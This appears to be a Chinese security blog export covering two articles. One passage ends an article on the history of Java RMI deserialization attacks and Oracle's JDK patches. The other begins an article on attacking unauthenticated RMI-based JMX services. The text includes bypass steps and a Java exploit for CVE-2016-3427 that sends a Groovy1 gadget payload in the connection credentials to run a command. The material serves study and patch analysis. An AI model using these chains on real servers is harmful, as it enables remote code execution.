src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/45.png"></p><p>使用UnicastRefRemoteObject链绕过官方对于UnicastRef链的修复</p><h3 id="5、jdk-x3D-8u241"><a href="#5、jdk-x3D-8u241" class="headerlink" title="5、jdk &#x3D; 8u241"></a>5、jdk &#x3D; 8u241</h3><h4 id="5-1-修复1：RMI-修复UnicastRefRemoteObject链绕过的问题"><a href="#5-1-修复1：RMI-修复UnicastRefRemoteObject链绕过的问题" class="headerlink" title="5.1 修复1：RMI 修复UnicastRefRemoteObject链绕过的问题"></a>5.1 修复1：RMI 修复UnicastRefRemoteObject链绕过的问题</h4><p>在jdk8u241对UnicastRefRemoteObject链的利用做了修复，有两处：</p><p>1、sun.rmi.registry.RegistryImpl_Skel的bind、lookup、unbind传输的String类型参数使用readObject(String.class)进行反序列化操作</p><p>2、java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod 在调用ref.invoke前检测Method对象表示方法所在类的Class对象（即这里Gadget chain中的RMIServerSocketFactory）是否实现了Remote接口</p><p>这两处补丁针对性修复了UnicastRefRemoteObject链，具体如下</p><p>sun.rmi.registry.RegistryImpl_Skel#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/46.png"></p><p>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/47.png"></p><p>var2 是调用栈中触发代理handler的方法（createServerSocket）， 我们无法控制此参数，Gadget中的关键类RMIServerSocketFactory没有实现Remote接口导致反序列化中断失败。修复的调用栈如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRemoteObject gadget chain：<br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#reexport</span><br>java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRemoteObject<span class="hljs-selector-id">#exportObject</span><br>...<br>            sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPTransport<span class="hljs-selector-id">#listen</span><br>                sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.tcp</span>.TCPEndpoint<span class="hljs-selector-id">#newServerSocket</span><br>                com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.proxy</span>.<span class="hljs-variable">$Proxy1</span><span class="hljs-selector-class">.createServerSocket</span>()<br>                    java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invoke</span><br>                        java<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.RemoteObjectInvocationHandler<span class="hljs-selector-id">#invokeRemoteMethod</span><span class="hljs-comment">//修复2</span><br>                        sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="6、jdk-≥-8u241-的利用方式—应用层反序列化问题"><a href="#6、jdk-≥-8u241-的利用方式—应用层反序列化问题" class="headerlink" title="6、jdk ≥ 8u241 的利用方式—应用层反序列化问题"></a>6、jdk ≥ 8u241 的利用方式—应用层反序列化问题</h3><blockquote><p>目前如果目标的JDK版本大于或等于8u241，暂无法利用内置方法完成攻击。但是还可以寻找应用程序级别的方法，当传递的是Object、Remote、Map等类型参数时，我们可以利用其传递构造的恶意对象进行利用。</p></blockquote><p>在3.2章节我们利用“调用自定义方法”的逻辑去调用了内置的bind方法，系统在处理参数时使用反序列化操作无过滤导致出现问题。这里利用的也是这个原理，当客户端调用服务端自定义方法时，服务端根据<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法、unmarshalParameters解析参数、最后invoke反射调用<img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/48.png"></p><p>在sun.rmi.server.UnicastServerRef#unmarshalParametersUnchecked方法中对每个参数依次解析</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/49.png"></p><p>sun.rmi.server.UnicastRef#unmarshalValue 当参数类型非基本数据类型、非String类型时直接调用readObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/50.png"></p><h3 id="7、错误排查"><a href="#7、错误排查" class="headerlink" title="7、错误排查"></a>7、错误排查</h3><p>在漏洞利用过程中会出现各种报错，本节分析各种报错出现原因及对应解决绕过方案</p><h4 id="7-1-ObjectInputFilter-REJECTED"><a href="#7-1-ObjectInputFilter-REJECTED" class="headerlink" title="7.1  ObjectInputFilter REJECTED"></a>7.1  ObjectInputFilter REJECTED</h4><p>当使用Ysoserial的ysoserial.exploit.RMIRegistryExploit结合CommonsCollections6利用链攻击目标RMI服务器时出现该报错</p><p>目标RMI服务日志信息：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 6, depth: 2, bytes: 298, ex: n/a<br></code></pre></td></tr></table></figure><p>攻击者日志信息：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InvalidClassException</span>: <span class="hljs-attribute">filter</span> status: REJECTED<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/51.png"></p><p>这种情况下是本文2.1限制1中提到的JEP290生效，用于包装CommonsCollections6的AnnotationInvocationHandler不在JEP290的白名单中导致漏洞利用失败。利用UnicastRef链绕过即可</p><h4 id="7-2-Registry-Registry-bind-disallowed"><a href="#7-2-Registry-Registry-bind-disallowed" class="headerlink" title="7.2 Registry.Registry.bind disallowed"></a>7.2 Registry.Registry.bind disallowed</h4><p>当使用绕过JEP290的UnicastRef链结合RMIConnectionImpl_Stub类攻击目标RMI服务器时出现该报错</p><p>攻击者日志信息：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">java.rmi.AccessException: Registry.Registry.bind disallowed; <span class="hljs-built_in">origin</span> /<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.1</span> <span class="hljs-built_in">is</span> non-<span class="hljs-built_in">local</span> host<br></code></pre></td></tr></table></figure><p>目标环境为JDK8u121</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/52.png"></p><p>目标环境为JDK8u141</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/53.png"></p><p>仔细查看发现虽然报错都是Registry.Registry.bind disallowed，但是前者利用成功，后者却失败了。141的调用栈并没有执行到RegistryImpl.bind。该种情况与本文3.1章节中分析的一致，Oracle官方将checkAccess地址检查从RegistryImpl.bind提前到了RegistryImpl_Skel.dispatch，导致漏洞利用失败。所以我们根据报错可以推断出利用情况：如果调用栈执行到了RegistryImpl.bind再报错，说明漏洞利用已经完成，反之则说明目标JDK版本大于等于8u141，需要使用我们改造的lookup进行利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/54.png"></p><h4 id="7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String"><a href="#7-3-java-lang-ClassCastException-xxx-cannot-be-cast-to-java-lang-String" class="headerlink" title="7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String"></a>7.3 java.lang.ClassCastException: xxx cannot be cast to java.lang.String</h4><p>当使用绕过JEP290—local限制的UnicastRef链结合RMIConnectionImpl_Stub类、改造的lookup()攻击目标RMI服务器，效果及报错如上图。虽然报类型转换错误，但是漏洞已经利用完成</p><h4 id="7-4-Cannot-cast-an-object-to-java-lang-String"><a href="#7-4-Cannot-cast-an-object-to-java-lang-String" class="headerlink" title="7.4 Cannot cast an object to java.lang.String"></a>7.4 Cannot cast an object to java.lang.String</h4><p>当使用UnicastRemoteObject链结合改造的lookup()攻击基于JDK8u241的目标RMI服务器时出现该报错</p><p>攻击者日志信息：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ClassCastException</span>: Cannot cast an <span class="hljs-selector-tag">object</span> to java<span class="hljs-selector-class">.lang</span>.String<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/55.png"></p><p>这种情况是本章5.1提到的Oracle官方在JDK8u241用于修复UnicastRefRemoteObject链的补丁，最终在反序列化时报错java.io.ObjectInputStream#readObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/56.png"></p><p>这种情况下说明目标的JDK版本高于或等于8u241版本，目前只能使用应用层的方法进行利用了</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>本文基于Oracle官方对于RMI利用的修复历史，依次分析了JDK8u121的JEP290修复绕过、JDK8u141的来源限制、JDK8u231对于UnicastRef链的修复、JDK8u241对于UnicastRefRemoteObject链的修复及各补丁的绕过情况。这部分知识网上资料很多，但大多是分析单个版本的利用手法、修复及绕过。自己看了一圈后，感觉还是懵懂，深知自己对于这部分内容的储备及理解不够，遂花了亿点时间整理此万字长文。也希望对各位学习这部分知识的师傅有帮助。</p><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a><br><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a><br><a href="https://www.anquanke.com/post/id/197829">https://www.anquanke.com/post/id/197829</a><br><a href="http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">http://code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html</a><br><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Attack JMX Service的打开方式</title>
    <link href="/2022/How-to-attack-RMI-based-JMX-services/"/>
    <url>/2022/How-to-attack-RMI-based-JMX-services/</url>
    
    <content type="html"><![CDATA[<p>有次漏洞挖掘项目中碰到了未授权JMX的情况，在复盘时发现对于整套攻击JMX服务的方式不太了解。趁着最近有时间 对JMX相关知识来次补充，遂写了此文。主要对JMX服务未鉴权时的利用方式、JMX各账户权限可对应执行的操作、Oracle官方对于漏洞的修复、鉴权后的攻击利用方式做了分析演示。在梳理完此文后基本上对攻击JMX服务有底了，也成功利用这些特性PWN掉了***产品，中间的过程也比较有趣，等有机会再做分享…</p><h2 id="1、基础知识"><a href="#1、基础知识" class="headerlink" title="1、基础知识"></a>1、基础知识</h2><p>JMX是JAVA1.5引入的新特性，全称为Java Management Extension，即Java管理扩展，是管理&#x2F;监控应用程序、设备、系统对象的工具。这些被管理的对象都可以抽象为MBean进行表示，客户端连接到服务端来管理MBean，如查询MBean属性、调用MBean方法等操作。而MBean的代码定义是有要求的，需要实现一个接口，所有需要对外公开的方法都需要在该接口中声明。另外此接口要求在MBean类名后加上MBean后缀，这里例子中的MBean类是Hello，接口为HelloMBean</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//Hello.java</span><br>package org.<span class="hljs-property">example</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> newName</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = newName;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello: &quot;</span> + name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>HelloMBean接口：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//HelloMBean.java</span><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloMBean</span> </span>&#123;<br>    <span class="hljs-comment">// getter and setter for the attribute &quot;name&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> getName();<br>    <span class="hljs-keyword">public</span> void setName(<span class="hljs-keyword">String</span> <span class="hljs-keyword">new</span><span class="hljs-type">Name</span>);<br>    <span class="hljs-comment">// Bean method &quot;sayHello&quot;</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于管理器而言，这些MBean中公开的方法，最终会被JMX转化为属性（ Attribute ）、调用（ Invoke ）、监听（ Listener ）等概念。默认情况下每个Java进程都运行着MBean管理服务，使用<code>ManagementFactory.getPlatformMBeanServer()</code>获取到MBeanServer后可对MBean进行操作。下面的例子模拟管理器注册MBean并显示当前java进程中的所有MBean</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/1.png"></p><p>如果想让我们的MBean在管理器上可调用，那么需要指定一个<code>ObjectName</code>对象，关于对象名称的详细语法可参考：<a href="https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html%E3%80%82">https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html。</a></p><p> Object Name 在注册MBean时用于指定名称，在查询的时候可以指定正则用于查询，去匹配名称符合正则条件的MBean。每个Object Name都需要包含一个type关键属性</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//MBeanExample.java<br>package org.example;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectInstance;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> MBeanExample &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>        // <span class="hljs-keyword">Create</span> a <span class="hljs-built_in">new</span> MBean instance <span class="hljs-keyword">from</span> Hello (HelloMBean interface)<br>        Hello mbean = <span class="hljs-built_in">new</span> Hello();<br>        // <span class="hljs-keyword">Create</span> an <span class="hljs-keyword">object</span> <span class="hljs-type">name</span>,<br>        ObjectName mbeanName = <span class="hljs-built_in">new</span> ObjectName(&quot;org.example.Hello:type=HelloMBean&quot;);<br>        // <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the MBean <span class="hljs-keyword">server</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">current</span> Java process<br>        MBeanServer <span class="hljs-keyword">server</span> = ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-keyword">server</span>.registerMBean(mbean, mbeanName);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> : <span class="hljs-keyword">server</span>.queryMBeans(<span class="hljs-built_in">new</span> ObjectName(&quot;*:*&quot;), <span class="hljs-keyword">null</span>))<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println( ((ObjectInstance)<span class="hljs-keyword">object</span>).getObjectName() );<br>        &#125;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Press any key to exit&quot;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用jconsole连接本地的org.example.MBeanExample类起的9052进程后，可以设置MBean的属性&#x2F;调用方法，如我们这里的sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/2.png"></p><p>调用sayHello()方法</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/3.png"></p><p>也可以开启远程服务，将Hello、HelloMBean、MBeanExample打包为jmxserver.jar包后，用如下命令开启调试功能、JMX监听端口并设置非认证。这里为演示命令执行的效果，将groovy-2.3.9.jar添加到classpath中，方便我们后续利用Groovy Gadget</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -Xmx5g -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=<span class="hljs-number">5005</span>  -Dcom.sun.management.jmxremote.port=<span class="hljs-number">2222</span> -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -cp jmxserver.jar;C:\tools\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-repository\org\codehaus\groovy\groovy\<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>\groovy-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>.jar org.example.MBeanExample<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/4.png"></p><p>使用nmap扫描其端口可以看到，2222端口MBean管理服务实际上是基于RMI Registry的，对象名称为jmxrmi，stub端口为56139</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/5.png"></p><h2 id="2、攻击JMX"><a href="#2、攻击JMX" class="headerlink" title="2、攻击JMX"></a>2、攻击JMX</h2><p>我们按照整体调用流程、过程中存在的利用点、官方对漏洞的修复措施及后续利用进行分析，也为了方便理解，个人将攻击JMX服务分为5种利用方式：</p><p>1、jmx-url连接地址可控的JNDI注入利用方式</p><p>2、攻击RMI Registry的利用方式</p><p>3、RMI层”自定义”方法newClient利用方式</p><p>4、JMX层MBean方法getLoggerLevel&#x2F;gcClassHistogram利用方式</p><p>5、MLET动态加载Evil MBean的利用方式</p><p>第一种是针对JMX客户端的利用方式，也捎带看一下。后面几种都是针对JMX服务，其中234都需要目标ClassPath存在可用的Gadget链，而第5个MLET动态加载是载入执行攻击者创建的恶意MBean类方法，所以没有Gadget的限制。从整体看，JMX客户端与服务端交互的流程及利用点如下:</p><p>1、客户端使用javax.naming.InitialContext#lookup获取到名称为”jmxrmi”的 Stub代理对象，<strong>当JMX url可控时，会造成JNDI注入的问题</strong>。这是第一个利用点</p><p>2、客户端调用javax.management.remote.rmi.RMIServer#newClient去获取RMIConnectionImpl Stub代理对象。当JMX服务需要验证时，会使用JAAS-based authenticator进行权限校验：根据服务的启动参数及jmxremote.password、jmxremote.access配置文件去匹配，当校验通过后返回代理对象。<br>这部分会涉及两个利用点：<br>a、JMX底层是依据RMI进行通信，当JDK版本在低版本时，可以使用攻击RMI Registry的exp进行攻击，<strong>可利用bind&#x2F;lookup方法传输恶意序列数据&#x2F;UnicastRef链利用</strong>。这是第二个利用点<br>b、newClient方法符合我们在攻击RMI中提到的<strong>应用层反序列化问题</strong>情况，参数为Object类型，可以塞入我们的恶意Padyload数据。这是第三个利用点</p><p>3、客户端invoke调用RMIConnectionImpl Stub代理对象的方法去操作MBean&#x2F;获取MBean信息<br>这部分会涉及两个攻击点：<br>a、JMX层在<strong>还原MBean方法参数时也是采用反序列化方式</strong>进行还原的，所以可将恶意数据塞入默认MBean的有参方法。这是第四个利用点<br>b、在客户端连接成功创建MBean时，<strong>可调用MLET动态加载的方式去加载攻击者构建的Evil MBean完成利用</strong>。这是第五个利用点</p><p>下面是详细分析及密码验证后的绕过方式</p><h3 id="2-1-jmx-url连接地址可控的JNDI注入利用方式"><a href="#2-1-jmx-url连接地址可控的JNDI注入利用方式" class="headerlink" title="2.1 jmx-url连接地址可控的JNDI注入利用方式"></a>2.1 jmx-url连接地址可控的JNDI注入利用方式</h3><p>使用Java代码JMXConnectorFactory#connect连接JMX服务端时，会调用到InitialContext#lookup去获取名称为”jmxrmi”的远端对象。当JMX url可控时，会造成JNDI注入的问题，调用栈及演示如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">JMX JNDI Gadget:<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.JMXConnectorFactory</span><span class="hljs-selector-class">.connect</span>(JMXConnectorFactory<span class="hljs-selector-class">.java</span>:<span class="hljs-number">270</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">287</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServer</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1922</span>)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.findRMIServerJNDI</span>(RMIConnector<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1955</span>)<br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.InitialContext</span><span class="hljs-selector-class">.lookup</span>(InitialContext<span class="hljs-selector-class">.java</span>:<span class="hljs-number">417</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/How-to-attack-RMI-based-JMX-services/6.png"></p><p>起个恶意LDAP服务，javaReferenceAddress放置我们的Groovy1链的Padyload，可以看到JMX客户端在JDK高版本的情况下成功触发命令执行。绕过原理见先前文章：<a href="https://pwnull.github.io/2022/jndi-injection-history/">当我们谈论JNDI注入时，我们在谈论什么</a></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/7.png"></p><p>JMX JNDI注入调用栈：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/8.png"></p><h3 id="2-2-攻击RMI-Registry的利用方式"><a href="#2-2-攻击RMI-Registry的利用方式" class="headerlink" title="2.2 攻击RMI Registry的利用方式"></a>2.2 攻击RMI Registry的利用方式</h3><p>因为JMX底层也是依据RMI进行通信，所以当JDK版本在低版本时，也可以使用攻击RMI Registry的exp进行攻击。且这种攻击方式的触发点是在RMI层，还未执行到JMX权限校验部分，所以不受JMX权限的限制</p><p>JEP290前的JDK8u112版本，使用默认ysoserial中的ysoserial.exploit.RMIRegistryExploit测试成功</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/9.png"></p><p>JEP290后的JDK131版本使用 UnicastRef 链绕过成功、141可使用改造后的lookup()+UnicastRef 链进行绕过</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/10.png"></p><p>测试JDK191版本下，在sun.management.jmxremote.SingleEntryRegistry#singleRegistryFilter触发检查，导致反序列化失败。</p><p>JMX服务端调试情况，在singleRegistryFilter触发白名单检查报错</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/11.png"></p><p>攻击端：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/12.png"></p><h3 id="2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427"><a href="#2-3-RMI层”自定义”方法newClient利用方式-CVE-2016-3427" class="headerlink" title="2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427"></a>2.3 RMI层”自定义”方法newClient利用方式-CVE-2016-3427</h3><p>当客户端使用<code>JMXConnectorFactory.connect</code>去连接服务端时，最终调用到<code>javax.management.remote.rmi.RMIServerImpl_Stub#newClient</code>发起连接。其实该方法符合我们在攻击RMI Registry中提到的“应用层反序列化问题”情况：newClient方法参数为Object类型，可以塞入我们的恶意Padyload（利用JMXConnector.CREDENTIALS配置添加），exp如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>    <span class="hljs-keyword">Object</span> obj = <span class="hljs-built_in">new</span> Groovy1().getObject(&quot;calc&quot;);<br>    connectWithJmxUrlByObject(obj);<br>&#125;<br><br>private static <span class="hljs-type">void</span> connectWithJmxUrlByObject(<span class="hljs-keyword">Object</span> credentials) throws MalformedURLException, IOException &#123;<br>    String url = &quot;service:jmx:rmi:///jndi/rmi://192.168.232.145:2222/jmxrmi&quot;;<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Trying to connect to &quot; + url + &quot; ...&quot;);<br>    Map&lt;String, <span class="hljs-keyword">Object</span>&gt; props = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();<br>    props.put(JMXConnector.CREDENTIALS, credentials);<br>    JMXConnector connector = JMXConnectorFactory.<span class="hljs-keyword">connect</span>(<span class="hljs-built_in">new</span> JMXServiceURL(url), props);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;Connected: &quot; + connector.getConnectionId());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println();<br>    connector.<span class="hljs-keyword">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>成功在JDK8u77-JMX服务上执行成功：</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/13.png"></p><p>该漏洞在JDK8u91时被修复，新增了javax.management.remote.rmi.RMIJRMPServerImpl.ExportedWrapper类继承自DeserializationChecker接口，该类实现了check、checkProxyClass方法检查参数类型，限制只能为[Ljava.lang.String;、java.lang.String类型。</p><p>在该版本的环境下，RMI层使用sun.rmi.server.UnicastServerRef#unmarshalParameters方法还原”自定义方法”参数时，由于jmx服务注册Target的weakImpl#referent为ExportedWrapper，所以在还原操作时会调用到ExportedWrapper#check检查序列化是否在白名单中，很显然Groovy1外部包装类AnnotationInvocationHandler不在白名单中，反序列化操作报错</p><p><img 